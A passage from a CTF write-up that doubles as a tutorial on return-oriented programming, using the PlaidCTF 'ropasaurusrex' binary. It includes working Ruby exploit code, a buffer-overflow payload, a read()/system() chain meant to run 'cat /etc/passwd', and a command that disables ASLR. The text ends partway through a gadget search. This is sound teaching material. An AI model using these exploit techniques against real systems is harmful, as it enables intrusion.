---
id: 1702
title: 'ropasaurusrex: a primer on return-oriented programming'
date: '2013-10-14T13:54:54-05:00'
author: 'Ron Bowes'
layout: revision
guid: 'http://blog.skullsecurity.org/2013/1555-revision-v1'
permalink: '/?p=1702'
---

One of the worst feelings when playing a capture-the-flag challenge is the [hindsight](http://knowyourmeme.com/memes/captain-hindsight) problem. You spend a few hours on a level—nothing like the amount of time I spent on [cnot](/blog/2013/epic-cnot-writeup-plaidctf), not by a fraction—and realize that it was actually pretty easy. But also a brainfuck. That's what ROP's all about, after all!

Anyway, even though I spent a lot of time working on the wrong solution (specifically, I didn't think to bypass [ASLR](https://en.wikipedia.org/wiki/Address_space_layout_randomization) for quite awhile), the process we took of completing the level first without, then with ASLR, is actually a good way to show it, so I'll take the same route on this post.

Before I say anything else, I have to thank HikingPete for being my wingman on this one. Thanks to him, we solved this puzzle much more quickly and, for a short time, were in 3rd place worldwide!  
  
Coincidentally, I've been meaning to write a post on [ROP](https://en.wikipedia.org/wiki/Return-oriented_programming) for some time now. I even wrote a vulnerable demo program that I was going to base this on! But, since PlaidCTF gave us this challenge, I thought I'd talk about it instead! This isn't just a writeup, this is designed to be a fairly in-depth primer on return-oriented programming! If you're more interested in the process of solving a CTF level, have a look at [my writeup of cnot](/blog/2013/epic-cnot-writeup-plaidctf). :)

## What the heck is ROP?

ROP—return-oriented programming—is a modern name for a classic exploit called "[return into libc](https://en.wikipedia.org/wiki/Return-to-libc_attack)". The idea is that you found an overflow or other type of vulnerability in a program that lets you take control, but you have no reliable way get your code into executable memory ([DEP](https://en.wikipedia.org/wiki/Data_Execution_Prevention), or data execution prevention, means that you can't run code from anywhere you want anymore).

With ROP, you can pick and choose pieces of code that are already in sections executable memory and followed by a '[return](https://en.wikipedia.org/wiki/Return_statement)'. Sometimes those pieces are simple, and sometimes they're complicated. In this exercise, we only need the simple stuff, thankfully!

But, we're getting ahead of ourselves. Let's first learn a little more about the [stack](https://en.wikipedia.org/wiki/Call_stack)! I'm not going to spend a *ton* of time explaining the stack, so if this is unclear, please check out [my assembly tutorial](/wiki/index.php/The_Stack).

## The stack

I'm sure you've heard of the stack before. [Stack overflows](https://en.wikipedia.org/wiki/Stack_overflow)? Smashing the stack? But what's it actually mean? If you already know, feel free to treat this as a quick primer, or to just skip right to the next section. Up to you!

The simple idea is, let's say function <tt>A()</tt> calls function <tt>B()</tt> with two parameters, 1 and 2. Then <tt>B()</tt> calls <tt>C()</tt> with two parameters, 3 and 4. When you're in <tt>C()</tt>, the stack looks like this:

```

+----------------------+
|         ...          | (higher addresses)
+----------------------+

+----------------------+ <-- start of 'A's stack frame
|   [return address]   | <-- address of whatever called 'A'
+----------------------+
|   [frame pointer]    |
+----------------------+
|   [local variables]  |
+----------------------+

+----------------------+ <-- start of 'B's stack frame
|         2 (parameter)|
+----------------------+
|         1 (parameter)|
+----------------------+
|   [return address]   | <-- the address that 'B' returns to
+----------------------+
|   [frame pointer]    |
+----------------------+
|   [local variables]  | 
+----------------------+

+----------------------+ <-- start of 'C's stack frame
|         4 (parameter)|
+----------------------+
|         3 (parameter)|
+----------------------+
|   [return address]   | <-- the address that 'C' returns to
+----------------------+

+----------------------+
|         ...          | (lower addresses)
+----------------------+
```

This is quite a mouthful (eyeful?) if you don't live and breathe all the time at this depth, so let me explain a bit. Every time you call a function, a new "stack frame" is built. A "frame" is simply some memory that the function allocates for itself on the stack. In fact, it doesn't even allocate it, it just adds stuff to the end and updates the <tt>esp</tt> register so any functions it calls know where its own stack frame needs to start (<tt>esp</tt>, the stack pointer, is basically a variable).

This stack frame holds the context for the current function, and lets you easily a) build frames for new functions being called, and b) return to previous frames (i.e., return from functions). <tt>esp</tt> (the stack pointer) moves up and down, but always points to the top of the stack (the lowest address).

Have you ever wondered where a function's local variables go when you call another function (or, better yet, you call the same function again recursively)? Of course not! But if you did, now you'd know: they wind up in an old stack frame that we return to later!

Now, let's look at what's stored on the stack, in the order it gets pushed (note that, confusingly, you can draw a stack either way; in this document, the stack grows from top to bottom, so the older/callers are on top and the newer/callees are on the bottom):

- Parameters: The parameters that were passed into the function by the caller—these are *extremely* important with ROP.
- Return address: Every function needs to know where to go when it's done. When you call a function, the address of the instruction right after the call is pushed onto the stack prior to entering the new function. When you return, the address is popped off the stack and is jumped to. This is extremely important with ROP.
- Saved frame pointer: Let's totally ignore this. Seriously. It's just something that compilers typically do, except when they don't, and we won't speak of it again.
- Local variables: A function can allocate as much memory as it needs (within reason) to store local variables. They go here. They don't matter at all for ROP and can be safely ignored.

So, to summarize: when a function is called, parameters are pushed onto the stack, followed by the return address. When the function returns, it grabs the return address off the stack and jumps to it. The parameters pushed onto the stack are [removed by the calling function](https://en.wikipedia.org/wiki/X86_calling_conventions#cdecl), [except when they're not](https://en.wikipedia.org/wiki/X86_calling_conventions#stdcall). We're going to assume the caller cleans up, that is, the function doesn't clean up after itself, since that's is how it works in this challenge (and most of the time on Linux).

## Heaven, hell, and stack frames

The main thing you have to understand to know ROP is this: a function's entire universe is its stack frame. The stack is its god, the parameters are its commandments, local variables are its sins, the saved frame pointer is its bible, and the return address is its heaven (okay, probably hell). It's all right there in the [Book of Intel](http://www.intel.com/content/www/us/en/processors/architectures-software-developer-manuals.html), chapter 3, verses 19 - 26 (note: it isn't actually, don't bother looking).

Let's say you call the <tt>sleep()</tt> function, and get to the first line; its stack frame is going to look like this:

```

          ...            <-- don't know, don't care territory (higher addresses)
+----------------------+
|      [seconds]       |
+----------------------+
|   [return address]   | <-- esp points here
+----------------------+
          ...            <-- not allocated, don't care territory (lower addresses)
```

When <tt>sleep()</tt> starts, this stack frame is all it sees. It can save a frame pointer (crap, I mentioned it twice since I promised not to; I swear I won't mention it again) and make room for local variables by subtracting the number of bytes it wants from <tt>esp</tt> (ie, making <tt>esp</tt> point to a lower address). It can call other functions, which create new frames under <tt>esp</tt>. It can do many different things; what matters is that, when it <tt>sleep()</tt> starts, the stack frame makes up its entire world.

When <tt>sleep()</tt> returns, it winds up looking like this:

```

          ...            <-- don't know, don't care territory (higher addresses)
+----------------------+
|      [seconds]       | <-- esp points here
+----------------------+
| [old return address] | <-- not allocated, don't care territory starts here now
+----------------------+
          ...            (lower addresses)
```

And, of course, the caller, after <tt>sleep()</tt> returns, will remove "seconds" from the stack by adding 4 to <tt>esp</tt> (later on, we'll talk about how we have to use <tt>pop/pop/ret</tt> constructs to do the same thing).

In a properly working system, this is how life works. That's a safe assumption. The "seconds" value would only be on the stack if it was pushed, and the return address is going to point to the place it was called from. Duh. How else would it get there?

## Controlling the stack

...well, since you asked, let me tell you. We've all heard of a "stack overflow", which involves overwriting a variable on the stack. What's that mean? Well, let's say we have a frame that looks like this:

```

          ...            <-- don't know, don't care territory (higher addresses)
+----------------------+
|      [seconds]       |
+----------------------+
|   [return address]   | <-- esp points here
+----------------------+
|     char buf[16]     |
|                      |
|                      |
|                      |
+----------------------+
          ...            (lower addresses)
```

The variable <tt>buf</tt> is 16 bytes long. What happens if a program tries to write to the 17<sup>th</sup> byte of buf (i.e., <tt>buf\[16\]</tt>)? Well, it writes to the last byte—[little endian](https://en.wikipedia.org/wiki/Endianness)—of the return address. The 18<sup>th</sup> byte writes to the second-last byte of the return address, and so on. Therefore, we can change the return address to point to anywhere we want. *Anywhere we want*. So when the function returns, where's it go? Well, it thinks it's going to where it's supposed to go—in a perfect world, it would be—but nope! In this case, it's going to wherever the attacker wants it to. If the attacker says to jump to [0](https://en.wikipedia.org/wiki/Zero_page), it jumps to 0 and crashes. If the attacker says to go to <tt>0x41414141</tt> ("AAAA"), it jumps there and probably crashes. If the attacker says to jump to the stack... well, that's where it gets more complicated...

## DEP

Traditionally, an attacker would change the return address to point to the stack, since the attacker already has the ability to put code on the stack (after all, code is just a bunch of bytes!). But, being that it was such a common and easy way to exploit systems, those assholes at OS companies (just kidding, I love you guys :) ) put a stop to it by introducing data execution prevention, or DEP. On any DEP-enabled system, you can no longer run code on the stack—or, more generally, anywhere an attacker can write—instead, it crashes.

So how the hell do I run code without being allowed to run code!?

Well, we're going to get to that. But first, let's look at the vulnerability that the challenge uses!

## The vulnerability

Here's the vulnerable function, fresh from IDA:

```

<span class="lnr"> 1 </span>  <span class="Statement">.text</span>:080483F4<span class="Identifier">vulnerable_function</span> <span class="Identifier">proc</span> <span class="Identifier">near</span>
<span class="lnr"> 2 </span>  <span class="Statement">.text</span>:080483F4
<span class="lnr"> 3 </span>  <span class="Statement">.text</span>:080483F4<span class="Identifier">buf</span>             = <span class="Identifier">byte</span> <span class="Identifier">ptr</span> -<span class="Constant">88</span><span class="Identifier">h</span>
<span class="lnr"> 4 </span>  <span class="Statement">.text</span>:080483F4
<span class="lnr"> 5 </span>  <span class="Statement">.text</span>:080483F4         <span class="Identifier">push</span>    <span class="Identifier">ebp</span>
<span class="lnr"> 6 </span>  <span class="Statement">.text</span>:080483F5         <span class="Identifier">mov</span>     <span class="Identifier">ebp</span>, <span class="Identifier">esp</span>
<span class="lnr"> 7 </span>  <span class="Statement">.text</span>:080483F7         <span class="Identifier">sub</span>     <span class="Identifier">esp</span>, <span class="Constant">98</span><span class="Identifier">h</span>
<span class="lnr"> 8 </span>  <span class="Statement">.text</span>:080483FD         <span class="Identifier">mov</span>     <span class="Identifier">dword</span> <span class="Identifier">ptr</span> [<span class="Identifier">esp</span>+<span class="Constant">8</span>], <span class="Constant">100</span><span class="Identifier">h</span> <span class="Comment">; nbytes</span>
<span class="lnr"> 9 </span>  <span class="Statement">.text</span>:08048405         <span class="Identifier">lea</span>     <span class="Identifier">eax</span>, [<span class="Identifier">ebp</span>+<span class="Identifier">buf</span>]
<span class="lnr">10 </span>  <span class="Statement">.text</span>:0804840B         <span class="Identifier">mov</span>     [<span class="Identifier">esp</span>+<span class="Constant">4</span>], <span class="Identifier">eax</span>    <span class="Comment">; buf</span>
<span class="lnr">11 </span>  <span class="Statement">.text</span>:0804840F         <span class="Identifier">mov</span>     <span class="Identifier">dword</span> <span class="Identifier">ptr</span> [<span class="Identifier">esp</span>], <span class="Constant">0 </span><span class="Comment">; fd</span>
<span class="lnr">12 </span>  <span class="Statement">.text</span>:08048416         <span class="Identifier">call</span>    <span class="Identifier">_read</span>
<span class="lnr">13 </span>  <span class="Statement">.text</span>:0804841B         <span class="Identifier">leave</span>
<span class="lnr">14 </span>  <span class="Statement">.text</span>:0804841C         <span class="Identifier">retn</span>
<span class="lnr">15 </span>  <span class="Statement">.text</span>:0804841C<span class="Identifier">vulnerable_function</span> <span class="Identifier">endp</span>
```

Now, if you don't know assembly, this might look daunting. But, in fact, it's simple. Here's the equivalent C:

```

<span class="lnr">1 </span>  <span class="Type">ssize_t</span> __cdecl vulnerable_function()
<span class="lnr">2 </span>  {
<span class="lnr">3 </span>    <span class="Type">char</span> buf[<span class="Constant">136</span>];
<span class="lnr">4 </span>    <span class="Statement">return</span> read(<span class="Constant">0</span>, buf, <span class="Constant">256</span>);
<span class="lnr">5 </span>  }
```

So, it reads 256 bytes into a 136-byte buffer. Goodbye Mr. Stack!

You can easily validate that by running it, piping in a bunch of 'A's, and seeing what happens:

```

<span class="lnr">1 </span>  ron@debian-x86 ~ $ <span class="Statement">ulimit</span> <span class="Special">-c</span> unlimited
<span class="lnr">2 </span>  ron@debian-x86 ~ $ perl <span class="Special">-e</span> <span class="Statement">"</span><span class="Constant">print 'A'x300</span><span class="Statement">"</span> | ./ropasaurusrex
<span class="lnr">3 </span>  Segmentation fault <span class="PreProc">(</span><span class="Special">core dumped</span><span class="PreProc">)</span>
<span class="lnr">4 </span>  ron@debian-x86 ~ $ gdb ./ropasaurusrex core
<span class="lnr">5 </span>  <span class="Statement">[</span>...<span class="Statement">]</span>
<span class="lnr">6 </span>  Program terminated with signal <span class="Constant">11</span>, Segmentation fault.
<span class="lnr">7 </span>  <span class="Comment">#0  0x41414141 in ?? ()</span>
<span class="lnr">8 </span>  <span class="PreProc">(</span><span class="Special">gdb</span><span class="PreProc">)</span>
```

Simply speaking, it means that we overwrote the return address with the letter A 4 times (<tt>0x41414141</tt> = "AAAA").

Now, there are good ways and bad ways to figure out exactly what you control. I used a bad way. I put "BBBB" at the end of my buffer and simply removed 'A's until it crashed at <tt>0x42424242</tt> ("BBBB"):

```

<span class="lnr">1 </span>  ron@debian-x86 ~ $ perl <span class="Special">-e</span> <span class="Statement">"</span><span class="Constant">print 'A'x140;print 'BBBB'</span><span class="Statement">"</span> | ./ropasaurusrex
<span class="lnr">2 </span>  Segmentation fault <span class="PreProc">(</span><span class="Special">core dumped</span><span class="PreProc">)</span>
<span class="lnr">3 </span>  ron@debian-x86 ~ $ gdb ./ropasaurusrex core
<span class="lnr">4 </span>  <span class="Comment">#0  0x42424242 in ?? ()</span>
```

If you want to do this "better" (by which I mean, slower), check out Metasploit's [pattern\_create.rb](https://github.com/rapid7/metasploit-framework/blob/master/tools/pattern_create.rb) and [pattern\_offset.rb](https://github.com/rapid7/metasploit-framework/blob/master/tools/pattern_offset.rb). They're great when guessing is a slow process, but for the purpose of this challenge it was so quick to guess and check that I didn't bother.

## Starting to write an exploit

The first thing you should do is start running <tt>ropasaurusrex</tt> as a network service. The folks who wrote the CTF used [xinetd](https://en.wikipedia.org/wiki/Xinetd) to do this, but we're going to use [netcat](https://en.wikipedia.org/wiki/Netcat), which is just as good (for our purposes):

```

<span class="lnr">1 </span>$ <span class="Statement">while </span><span class="Statement">true</span><span class="Statement">;</span><span class="Statement"> </span><span class="Statement">do</span> nc <span class="Special">-vv</span> <span class="Statement">-l</span> <span class="Statement">-p</span> <span class="Constant">4444</span> <span class="Statement">-e</span> ./ropasaurusrex<span class="Statement">;</span> <span class="Statement">done</span>
<span class="lnr">2 </span>listening on <span class="Statement">[</span>any<span class="Statement">]</span> <span class="Constant">4444</span> ...
```

From now on, we can use <tt>localhost:4444</tt> as the target for our exploit and test if it'll work against the actual server.

You may also want to disable ASLR if you're following along:

```

<span class="lnr">1 </span>$ sudo sysctl <span class="Special">-w</span> <span class="Identifier">kernel.randomize_va_space</span>=<span class="Constant">0</span>
```

Note that this will make your system easier to exploit, so I don't recommend doing this outside of a lab environment!

Here's some ruby code for the initial exploit:

```

<span class="lnr"> 1 </span><span class="PreProc">require</span> <span class="Special">'</span><span class="Constant">socket</span><span class="Special">'</span>
<span class="lnr"> 2 </span>
<span class="lnr"> 3 </span>$ cat ./sploit.rb
<span class="lnr"> 4 </span>s = <span class="Type">TCPSocket</span>.new(<span class="Special">"</span><span class="Constant">localhost</span><span class="Special">"</span>, <span class="Constant">4444</span>)
<span class="lnr"> 5 </span>
<span class="lnr"> 6 </span><span class="Comment"># Generate the payload</span>
<span class="lnr"> 7 </span>payload = <span class="Special">"</span><span class="Constant">A</span><span class="Special">"</span>*<span class="Constant">140</span> +
<span class="lnr"> 8 </span>  [
<span class="lnr"> 9 </span>    <span class="Constant">0x42424242</span>,
<span class="lnr">10 </span>  ].pack(<span class="Special">"</span><span class="Constant">I*</span><span class="Special">"</span>) <span class="Comment"># Convert a series of 'ints' to a string</span>
<span class="lnr">11 </span>
<span class="lnr">12 </span>s.write(payload)
<span class="lnr">13 </span>s.close()
```

Run that with <tt>ruby ./sploit.rb</tt> and you should see the service crash:

```

<span class="lnr">1 </span>connect to <span class="Statement">[</span>127.0.0.1<span class="Statement">]</span> from debian-x86.skullseclabs.org <span class="Statement">[</span>127.0.0.1<span class="Statement">]</span> <span class="Constant">53451</span>
<span class="lnr">2 </span>Segmentation fault <span class="PreProc">(</span><span class="Special">core dumped</span><span class="PreProc">)</span>
```

And you can verify, using gdb, that it crashed at the right location:

```

<span class="lnr">1 </span>gdb <span class="Special">--quiet</span> ./ropasaurusrex core
<span class="lnr">2 </span><span class="Statement">[</span>...<span class="Statement">]</span>
<span class="lnr">3 </span>Program terminated with signal <span class="Constant">11</span>, Segmentation fault.
<span class="lnr">4 </span><span class="Comment">#0  0x42424242 in ?? ()</span>
```

We now have the beginning of an exploit!

## How to waste time with ASLR

I called this section 'wasting time', because I didn't realize—at the time—that ASLR was enabled. However, assuming no ASLR actually makes this a much more instructive puzzle. So for now, let's not worry about ASLR—in fact, let's not even *define* ASLR. That'll come up in the next section.

Okay, so what do we want to do? We have a vulnerable process, and we have the [libc](https://en.wikipedia.org/wiki/C_standard_library) shared library. What's the next step?

Well, our ultimate goal is to run system commands. Because [stdin and stdout](https://en.wikipedia.org/wiki/Standard_streams) are both hooked up to the [socket](https://en.wikipedia.org/wiki/Network_socket), if we could run, for example, <tt>system("cat /etc/passwd")</tt>, we'd be set! Once we do that, we can run any command. But doing that involves two things:

1. Getting the string <tt>cat /etc/passwd</tt> into memory somewhere
2. Running the <tt>system()</tt> function

### Getting the string into memory

Getting the string into memory actually involves two sub-steps:

1. Find some memory that we can write to
2. Find a function that can write to it

Tall order? Not really! First things first, let's find some memory that we can read and write! The most obvious place is the [.data](https://en.wikipedia.org/wiki/Data_segment) section:

```

<span class="lnr">1 </span>ron@debian-x86 ~ $ objdump <span class="Special">-x</span> ropasaurusrex  | <span class="Statement">grep</span> <span class="Special">-A1</span> <span class="Statement">'</span><span class="Constant">\.data</span><span class="Statement">'</span>
<span class="lnr">2 </span> <span class="Constant">23</span> .data         <span class="Constant">00000008</span>  <span class="Constant">08049620</span>  <span class="Constant">08049620</span>  <span class="Constant">00000620</span>  <span class="Constant">2</span>**<span class="Constant">2</span>
<span class="lnr">3 </span>                   CONTENTS, ALLOC, LOAD, DATA
<span class="lnr">4 </span>
```

Uh oh, .data is only 8 bytes long. That's not enough! In theory, any address that's long enough, writable, and not used will be enough for what we need. Looking at the output for <tt>objdump -x</tt>, I see a section called .dynamic that seems to fit the bill:

```

<span class="lnr">1 </span>
<span class="lnr">2 </span> <span class="Constant">20</span> .dynamic      000000d0  <span class="Constant">08049530</span>  <span class="Constant">08049530</span>  <span class="Constant">00000530</span>  <span class="Constant">2</span>**<span class="Constant">2</span>
<span class="lnr">3 </span>                   CONTENTS, ALLOC, LOAD, DATA
```

The .dynamic section holds information for dynamic linking. We don't need that for what we're going to do, so let's choose address <tt>0x08049530</tt> to overwrite.

The next step is to find a function that can write our command string to address <tt>0x08049530</tt>. The most convenient functions to use are the ones that are in the executable itself, rather than a library, since the functions in the executable won't change from system to system. Let's look at what we have:

```

<span class="lnr"> 1 </span>ron@debian-x86 ~ $ objdump <span class="Special">-R</span> ropasaurusrex
<span class="lnr"> 2 </span>
<span class="lnr"> 3 </span>ropasaurusrex:     <span class="Statement">file</span> format elf32-i386
<span class="lnr"> 4 </span>
<span class="lnr"> 5 </span>DYNAMIC RELOCATION RECORDS
<span class="lnr"> 6 </span>OFFSET   TYPE              VALUE
<span class="lnr"> 7 </span>08049600 R_386_GLOB_DAT    __gmon_start__
<span class="lnr"> 8 </span>08049610 R_386_JUMP_SLOT   __gmon_start__
<span class="lnr"> 9 </span>08049614 R_386_JUMP_SLOT   <span class="Statement">write</span>
<span class="lnr">10 </span>08049618 R_386_JUMP_SLOT   __libc_start_main
<span class="lnr">11 </span>0804961c R_386_JUMP_SLOT   <span class="Statement">read</span>
```

So, we have <tt>read()</tt> and <tt>write()</tt> immediately available. That's helpful! The <tt>read()</tt> function will read data from the socket and write it to memory. The prototype looks like this:

```

<span class="lnr">1 </span><span class="Type">ssize_t</span> read(<span class="Type">int</span> fd, <span class="Type">void</span> *buf, <span class="Type">size_t</span> count);
```

This means that, when you enter the <tt>read()</tt> function, you want the stack to look like this:

```

+----------------------+
|         ...          | - doesn't matter, other funcs will go here
+----------------------+

+----------------------+ <-- start of read()'s stack frame
|     size_t count     | - count, strlen("cat /etc/passwd")
+----------------------+
|      void *buf       | - writable memory, 0x08049530
+----------------------+
|        int fd        | - should be 'stdin' (0)
+----------------------+
|   [return address]   | - where 'read' will return
+----------------------+

+----------------------+
|         ...          | - doesn't matter, read() will use for locals
+----------------------+
```

We update our exploit to look like this (explanations are in the comments):

```

<span class="lnr"> 1 </span>$ cat sploit.rb
<span class="lnr"> 2 </span><span class="PreProc">require</span> <span class="Special">'</span><span class="Constant">socket</span><span class="Special">'</span>
<span class="lnr"> 3 </span>
<span class="lnr"> 4 </span>s = <span class="Type">TCPSocket</span>.new(<span class="Special">"</span><span class="Constant">localhost</span><span class="Special">"</span>, <span class="Constant">4444</span>)
<span class="lnr"> 5 </span>
<span class="lnr"> 6 </span><span class="Comment"># The command we'll run</span>
<span class="lnr"> 7 </span>cmd = <span class="Identifier">ARGV</span>[<span class="Constant">0</span>] + <span class="Special">"</span><span class="Special">\0</span><span class="Special">"</span>
<span class="lnr"> 8 </span>
<span class="lnr"> 9 </span><span class="Comment"># From objdump -x</span>
<span class="lnr">10 </span>buf = <span class="Constant">0x08049530</span>
<span class="lnr">11 </span>
<span class="lnr">12 </span><span class="Comment"># From objdump -D ./ropasaurusrex | grep read</span>
<span class="lnr">13 </span>read_addr = <span class="Constant">0x0804832C</span>
<span class="lnr">14 </span><span class="Comment"># From objdump -D ./ropasaurusrex | grep write</span>
<span class="lnr">15 </span>write_addr = <span class="Constant">0x0804830C</span>
<span class="lnr">16 </span>
<span class="lnr">17 </span><span class="Comment"># Generate the payload</span>
<span class="lnr">18 </span>payload = <span class="Special">"</span><span class="Constant">A</span><span class="Special">"</span>*<span class="Constant">140</span> +
<span class="lnr">19 </span>  [
<span class="lnr">20 </span>    cmd.length, <span class="Comment"># number of bytes</span>
<span class="lnr">21 </span>    buf,        <span class="Comment"># writable memory</span>
<span class="lnr">22 </span>    <span class="Constant">0</span>,          <span class="Comment"># stdin</span>
<span class="lnr">23 </span>    <span class="Constant">0x43434343</span>, <span class="Comment"># read's return address</span>
<span class="lnr">24 </span>
<span class="lnr">25 </span>    read_addr <span class="Comment"># Overwrite the original return</span>
<span class="lnr">26 </span>  ].reverse.pack(<span class="Special">"</span><span class="Constant">I*</span><span class="Special">"</span>) <span class="Comment"># Convert a series of 'ints' to a string</span>
<span class="lnr">27 </span>
<span class="lnr">28 </span><span class="Comment"># Write the 'exploit' payload</span>
<span class="lnr">29 </span>s.write(payload)
<span class="lnr">30 </span>
<span class="lnr">31 </span><span class="Comment"># When our payload calls read() the first time, this is read</span>
<span class="lnr">32 </span>s.write(cmd)
<span class="lnr">33 </span>
<span class="lnr">34 </span><span class="Comment"># Clean up</span>
<span class="lnr">35 </span>s.close()
```

We run that against the target:

```

<span class="lnr">1 </span>ron@debian-x86 ~ $ ruby sploit.rb <span class="Statement">"</span><span class="Constant">cat /etc/passwd</span><span class="Statement">"</span>
```

And verify that it crashes:

```

<span class="lnr">1 </span>listening on <span class="Statement">[</span>any<span class="Statement">]</span> <span class="Constant">4444</span> ...
<span class="lnr">2 </span>connect to <span class="Statement">[</span>127.0.0.1<span class="Statement">]</span> from debian-x86.skullseclabs.org <span class="Statement">[</span>127.0.0.1<span class="Statement">]</span> <span class="Constant">53456</span>
<span class="lnr">3 </span>Segmentation fault <span class="PreProc">(</span><span class="Special">core dumped</span><span class="PreProc">)</span>
```

Then verify that it crashed at the return address of <tt>read()</tt> (<tt>0x43434343</tt>) and wrote the command to the memory at <tt>0x08049530</tt>:

```

<span class="lnr">1 </span>$ gdb <span class="Special">--quiet</span> ./ropasaurusrex core
<span class="lnr">2 </span><span class="Statement">[</span>...<span class="Statement">]</span>
<span class="lnr">3 </span>Program terminated with signal <span class="Constant">11</span>, Segmentation fault.
<span class="lnr">4 </span><span class="Comment">#0  0x43434343 in ?? ()</span>
<span class="lnr">5 </span><span class="PreProc">(</span><span class="Special">gdb</span><span class="PreProc">)</span> x/s 0x08049530
<span class="lnr">6 </span>0x8049530:       <span class="Statement">"</span><span class="Constant">cat /etc/passwd</span><span class="Statement">"</span>
```

Perfect!

### Running it

Now that we've written <tt>cat /etc/passwd</tt> into memory, we need to call <tt>system()</tt> and point it at that address. It turns out, if we assume ASLR is off, this is easy. We know that the executable is linked with libc:

```

<span class="lnr">1 </span>$ ldd ./ropasaurusrex
<span class="lnr">2 </span>        linux-gate.so.1 <span class="Statement">=</span><span class="Statement">></span>  <span class="PreProc">(</span><span class="Special">0xb7703000</span><span class="PreProc">)</span>
<span class="lnr">3 </span>        libc.so.6 <span class="Statement">=</span><span class="Statement">></span> /lib/i686/cmov/libc.so.6 <span class="PreProc">(</span><span class="Special">0xb75aa000</span><span class="PreProc">)</span>
<span class="lnr">4 </span>        /lib/ld-linux.so.2 <span class="PreProc">(</span><span class="Special">0xb7704000</span><span class="PreProc">)</span>
```

And <tt>libc.so.6</tt> contains the <tt>system()</tt> function:

```

<span class="lnr">1 </span>$ objdump <span class="Special">-T</span> /lib/i686/cmov/libc.so.6 | <span class="Statement">grep</span> system
<span class="lnr">2 </span><span class="Constant">000f5470</span> g    DF .text  <span class="Constant">00000042</span>  GLIBC_2.0   svcerr_systemerr
<span class="lnr">3 </span><span class="Constant">00039450</span> g    DF .text  <span class="Constant">0000007d</span>  GLIBC_PRIVATE __libc_system
<span class="lnr">4 </span><span class="Constant">00039450</span>  w   DF .text  <span class="Constant">0000007d</span>  GLIBC_2.0   system
```

We can figure out the address where <tt>system()</tt> ends up loaded in ropasaurusrex in our debugger:

```

<span class="lnr">1 </span>$ gdb <span class="Special">--quiet</span> ./ropasaurusrex core
<span class="lnr">2 </span><span class="Statement">[</span>...<span class="Statement">]</span>
<span class="lnr">3 </span>Program terminated with signal <span class="Constant">11</span>, Segmentation fault.
<span class="lnr">4 </span><span class="Comment">#0  0x43434343 in ?? ()</span>
<span class="lnr">5 </span><span class="PreProc">(</span><span class="Special">gdb</span><span class="PreProc">)</span> x/x system
<span class="lnr">6 </span>0xb7ec2450 <span class="Statement"><</span>system<span class="Statement">></span>:    0x890cec83
```

Because <tt>system()</tt> only takes one argument, building the stackframe is pretty easy:

```

+----------------------+
|         ...          | - doesn't matter, other funcs will go here
+----------------------+

+----------------------+ <-- Start of system()'s stack frame
|      void *arg       | - our buffer, 0x08049530
+----------------------+
|   [return address]   | - where 'system' will return
+----------------------+
|         ...          | - doesn't matter, system() will use for locals
+----------------------+
```

Now if we stack this on top of our <tt>read()</tt> frame, things are looking pretty good:

```

+----------------------+
|         ...          |
+----------------------+

+----------------------+ <-- Start of system()'s stack frame
|      void *arg       |
+----------------------+
|   [return address]   |
+----------------------+

+----------------------+ <-- Start of read()'s frame
|     size_t count     |
+----------------------+
|      void *buf       |
+----------------------+
|        int fd        |
+----------------------+
| [address of system]  | <-- Stack pointer
+----------------------+

+----------------------+
|         ...          |
+----------------------+
```

At the moment that <tt>read()</tt> returns, the stack pointer is in the location shown above. When it returns, it pops <tt>read()</tt>'s return address off the stack and jumps to it. When it does, this is what the stack looks like when <tt>read()</tt> returns:

```

+----------------------+
|         ...          |
+----------------------+

+----------------------+ <-- Start of system()'s frame
|      void *arg       |
+----------------------+
|   [return address]   |
+----------------------+

+----------------------+ <-- Start of read()'s frame
|     size_t count     |
+----------------------+
|      void *buf       |
+----------------------+
|        int fd        | <-- Stack pointer
+----------------------+
| [address of system]  |
+----------------------+

+----------------------+
|         ...          |
+----------------------+
```

Uh oh, that's no good! The stack pointer is pointing to the middle of <tt>read()</tt>'s frame when we enter <tt>system()</tt>, not to the bottom of <tt>system()</tt>'s frame like we want it to! What do we do?

Well, when perform a ROP exploit, there's a very important construct we need called <tt>pop/pop/ret</tt>. In this case, it's actually <tt>pop/pop/pop/ret</tt>, which we'll call "pppr" for short. Just remember, it's enough "pops" to clear the stack, followed by a return.

<tt>pop/pop/pop/ret</tt> is a construct that we use to remove the stuff we don't want off the stack. Since <tt>read()</tt> has three arguments, we need to pop all three of them off the stack, then return. To demonstrate, here's what the stack looks like immediately after <tt>read()</tt> returns to a <tt>pop/pop/pop/ret</tt>:

```

+----------------------+
|         ...          |
+----------------------+

+----------------------+ <-- Start of system()'s frame
|      void *arg       |
+----------------------+
|   [return address]   |
+----------------------+

+----------------------+ <-- Special frame for pop/pop/pop/ret
| [address of system]  |
+----------------------+

+----------------------+ <-- Start of read()'s frame
|     size_t count     |
+----------------------+
|      void *buf       |
+----------------------+
|        int fd        | <-- Stack pointer
+----------------------+
| [address of "pppr"]  |
+----------------------+

+----------------------+
|         ...          |
+----------------------+
```

After "pop/pop/pop/ret" runs, but before it returns, we get this:

```

+----------------------+
|         ...          |
+----------------------+

+----------------------+ <-- Start of system()'s frame
|      void *arg       |
+----------------------+
|   [return address]   |
+----------------------+

+----------------------+ <-- pop/pop/pop/ret's frame
| [address of system]  | <-- stack pointer
+----------------------+

+----------------------+
|     size_t count     | <-- read()'s frame
+----------------------+
|      void *buf       |
+----------------------+
|        int fd        |
+----------------------+
| [address of "pppr"]  |
+----------------------+

+----------------------+
|         ...          |
+----------------------+
```

Then when it returns, we're exactly where we want to be:

```

+----------------------+
|         ...          |
+----------------------+

+----------------------+ <-- Start of system()'s frame
|      void *arg       |
+----------------------+
|   [return address]   | <-- stack pointer
+----------------------+

+----------------------+ <-- pop/pop/pop/ret's frame
| [address of system]  |
+----------------------+

+----------------------+ <-- Start of read()'s frame
|     size_t count     |
+----------------------+
|      void *buf       |
+----------------------+
|        int fd        |
+----------------------+
| [address of "pppr"]  |
+----------------------+

+----------------------+
|         ...          |
+----------------------+
```

Finding a <tt>pop/pop/pop/ret</tt> is pretty easy using <tt>objdump</tt>:

```

<span class="lnr">1 </span>$ <span class="Identifier">objdump</span> -<span class="Identifier">d</span> ./<span class="Identifier">ropasaurusrex</span> <span class="Comment">| egrep 'pop|ret'</span>
<span class="lnr">2 </span>[...]
<span class="lnr">3 </span> <span class="Constant">80484b5</span>:       <span class="Constant">5b</span>                      <span class="Identifier">pop</span>    <span class="Identifier">ebx</span>
<span class="lnr">4 </span> <span class="Constant">80484b6</span>:       <span class="Constant">5e</span>                      <span class="Identifier">pop</span>    <span class="Identifier">esi</span>
